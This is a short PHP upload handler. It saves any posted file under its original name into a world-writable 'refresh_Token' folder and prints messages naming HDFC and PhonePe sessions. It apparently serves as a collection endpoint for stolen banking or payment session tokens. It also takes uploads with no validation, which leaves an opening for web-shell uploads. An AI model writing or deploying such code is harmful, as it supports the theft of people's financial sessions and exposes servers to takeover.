<?php

$upload_dir = __DIR__ . "/refresh_Token/";
if (!file_exists($upload_dir)) {
    mkdir($upload_dir, 0777, true);
}

if (isset($_FILES['file'])) {
    $file_name = basename($_FILES['file']['name']);
    $file_path = $upload_dir . $file_name;
    
    if (move_uploaded_file($_FILES['file']['tmp_name'], $file_path)) {
        echo ": " . $file_path;
    } else {
        echo "hdfc session Not fetch";
    }
} else {
    echo "phonepe session fetch successfully";
}
?>